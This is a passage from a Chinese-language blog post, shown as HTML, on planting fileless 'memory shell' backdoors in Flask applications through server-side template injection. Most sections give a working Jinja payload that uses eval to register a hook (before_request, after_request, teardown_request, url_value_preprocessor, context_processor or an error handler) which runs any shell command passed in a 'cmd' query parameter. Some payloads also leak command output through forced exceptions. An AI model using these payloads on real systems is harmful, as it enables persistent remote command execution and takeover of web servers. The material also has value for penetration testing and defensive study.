app<span class="token punctuation">.</span>error_handler_spec<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">404</span><span class="token punctuation">]</span><span class="token punctuation">[</span>app<span class="token punctuation">.</span>_get_exc_class_and_code<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> c<span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> c
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/./../../../source/images/%E8%B7%AF%E7%94%B1%E6%8B%A6%E6%88%AA%E6%9E%84%E5%BB%BA%E5%86%85%E5%AD%98%E9%A9%AC1.1.png"></p>
<p><img src="/./../../../source/images/%E8%B7%AF%E7%94%B1%E6%8B%A6%E6%88%AA%E6%9E%84%E5%BB%BA%E5%86%85%E5%AD%98%E5%90%971.2.png"></p>
<h5 id="app-url-value-preprocessor"><a href="#app-url-value-preprocessor" class="headerlink" title="@app.url_value_preprocessor"></a>@app.url_value_preprocessor</h5><p> 它是 Flask 框架中的一个装饰器，用于在请求到达视图函数之前，对 URL 中的变量进行预处理。这通常用于从 URL 中提取特定的参数，并在整个请求生命周期中使用它们，或者用于为请求添加一些预处理逻辑。</p>
<p>用法如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> g<span class="token punctuation">,</span> request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token comment"># 定义预处理函数</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>url_value_preprocessor</span>
<span class="token keyword">def</span> <span class="token function">pull_lang_code</span><span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token punctuation">:</span>
    g<span class="token punctuation">.</span>lang_code <span class="token operator">=</span> values<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'lang_code'</span><span class="token punctuation">,</span> <span class="token string">'en'</span><span class="token punctuation">)</span>

<span class="token comment"># 一个示例视图函数，使用了预处理后的值</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/&lt;lang_code>/hello'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello in </span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">.</span>lang_code<span class="token punctuation">&#125;</span></span><span class="token string">!"</span></span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个装饰器最终调用的是<code>url_value_preprocessors</code>，在处理请求的时候，函数<code>flask.app.Flask.preprocess_request</code>先遍历了它来直接调用对应的处理函数，并且这个没有对函数的返回值进行处理，也就是无回显，是对全局生效。</p>
<p><img src="/./../../../source/images/%E8%B7%AF%E7%94%B1%E6%8B%A6%E6%88%AA%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC2.1.png"></p>
<p>但如果debug模式开启的话，我们可以构造异常，在异常中输出我们的信息，不开debug的情况下，我们可以尝试出网，通过反弹shell来获取权限，不出网的话就得考虑添加新的路由和修改配置了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>url_value_preprocessors<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> ep<span class="token punctuation">,</span> args <span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="1-debug模式下抛出异常"><a href="#1-debug模式下抛出异常" class="headerlink" title="1.debug模式下抛出异常"></a>1.debug模式下抛出异常</h6><p>利用异常来抛出回显，Python lambda 表达式中是不能直接<code>raise Exception</code>或者<code>try-except</code>可以使用下面的方法来在 lambda 表达式抛出异常，如果是在实战中的，异常可能会被日志记录。</p>
<h6 id="1-1方法一"><a href="#1-1方法一" class="headerlink" title="1.1方法一"></a>1.1方法一</h6><p>创建一个生成器对象，调用throw方法来引发异常</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>throw<span class="token punctuation">(</span>Exception<span class="token punctuation">(</span><span class="token string">'this is a tuple exception 11'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>throw<span class="token punctuation">(</span>Exception<span class="token punctuation">(</span><span class="token string">'this is a list exception'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token keyword">_</span><span class="token punctuation">:</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__iter__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>throw<span class="token punctuation">(</span>Exception<span class="token punctuation">(</span><span class="token string">'this is a dict exception'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>url_value_preprocessors<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> ep<span class="token punctuation">,</span> args<span class="token punctuation">:</span> <span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>throw<span class="token punctuation">(</span>Exception<span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">else</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/./../../../source/images/%E8%B7%AF%E7%94%B1%E6%8B%A6%E6%88%AA%E6%9E%84%E5%BB%BA%E5%86%85%E5%AD%98%E9%A9%AC2.3.png"></p>
<h6 id="1-2方法二"><a href="#1-2方法二" class="headerlink" title="1.2方法二"></a>1.2方法二</h6><p>用一定会抛出异常的表达式来抛出异常</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span>
<span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token string">'8sd***r'</span><span class="token punctuation">]</span>
<span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 回显有长度限制</span>
<span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>
<span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> <span class="token string">'nonexistent_attribute'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>url_value_preprocessors<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> ep<span class="token punctuation">,</span> args <span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/./../../../source/images/%E8%B7%AF%E7%94%B1%E6%8B%A6%E6%88%AA%E6%9E%84%E5%BB%BA%E5%86%85%E5%AD%98%E9%A9%AC2.2.png"></p>
<h6 id="1-3-方法三"><a href="#1-3-方法三" class="headerlink" title="1.3 方法三"></a>1.3 方法三</h6><p>通过exec执行语句</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'raise(Exception("this is an exception"))'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>url_value_preprocessors<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> ep<span class="token punctuation">,</span> args<span class="token punctuation">:</span> <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'raise(Exception(__import__(\'os\').popen(request.args.get(\'cmd\')).read()))'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="2-非debug的情况"><a href="#2-非debug的情况" class="headerlink" title="2.非debug的情况"></a>2.非debug的情况</h6><h6 id="2-1注册路由"><a href="#2-1注册路由" class="headerlink" title="2.1注册路由"></a>2.1注册路由</h6><p>上面的动态路由创建实现内存马已经讲过了，大差不差</p>
<h6 id="2-2反弹shell"><a href="#2-2反弹shell" class="headerlink" title="2.2反弹shell"></a>2.2反弹shell</h6><h5 id="app-before-request"><a href="#app-before-request" class="headerlink" title="@app.before_request"></a>@app.before_request</h5><p>这个装饰器用于注册一个函数，该函数会在每次请求之前执行。它常用于在处理请求之前进行一些预处理操作，如验证用户身份、设置全局变量等。最终操作的数据是<code>before_request_funcs</code>，这个装饰器可以有多个，按照注册顺序调用。可以通过<code>url_for.__globals__[&#39;current_app&#39;].__dict__[&#39;before_request_funcs&#39;]</code>查看有哪些。在处理请求的时候，函数<code>flask.app.Flask.preprocess_request</code>先对url进行预处理后对请求进行预处理。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>before_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token string">'&lt;pre>&#123;0&#125;&lt;/pre>'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span><span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token boolean">None</span>
<span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="app-after-request"><a href="#app-after-request" class="headerlink" title="@app.after_request"></a>@app.after_request</h5><p>这个装饰器用于注册一个函数，该函数会在每次请求之后调用，通常用于修改响应对象。其最终操作的数据为<code>after_request_funcs</code>，当一个请求在返回之前会传入一个<code>Response</code>调用<code>process_response</code>函数来对响应进行处理。定义的处理函数需要接收一个<code>Response</code>对象处理后返回<code>Response</code>对象。</p>
<p>在版本 1.1.0 中进行了更改：当没有处理程序时，即使对于默认的 500 响应，也会完成 after_request 函数和其他终结。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>after_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> resp<span class="token punctuation">:</span> ufg<span class="token punctuation">[</span><span class="token string">'Response'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'&lt;pre>&#123;0&#125;&lt;/pre>'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span><span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> resp<span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'ufg'</span><span class="token punctuation">:</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="app-teardown-request"><a href="#app-teardown-request" class="headerlink" title="@app.teardown_request"></a>@app.teardown_request</h5><p>这个装饰器用于注册一个函数，该函数会在每次请求结束后调用，无论请求是否成功。拆卸函数的返回值将被忽略。在请求结束后<code>do_teardown_request</code>函数会被调用。这个函数的也是没有回显的，所以可参考前面说到的方法。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>teardown_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> exc<span class="token punctuation">:</span>  <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'ufg'</span><span class="token punctuation">:</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="app-context-processor"><a href="#app-context-processor" class="headerlink" title="@app.context_processor"></a>@app.context_processor</h5><p>这个装饰器用于注册一个上下文处理器，该处理器返回的字典将合并到模板上下文中。最终操作的数据是<code>template_context_processors</code>，具体用法参考：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1196915">https://developer.aliyun.com/article/1196915</a> 直接点说就是用它来注册在模板中使用的变量，当模板渲染的时候会自动调用这个函数得到一个字典。然后用字典里面的变量去替换模板中的内容。所以作为内存马使用的话就比较局限了。由<code>update_template_context</code>函数来操作。</p>
<p>Payload如下，lambda函数里返回了一个字典，键值是<code>ak47</code>，要想拿到回显的话可以参考前面的内容，或者使在有 SSTI 的地方使用。貌似也可以配合模板操作的装饰器实现回显。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>template_context_processors<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'ak47'</span><span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span><span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'ufg'</span><span class="token punctuation">:</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
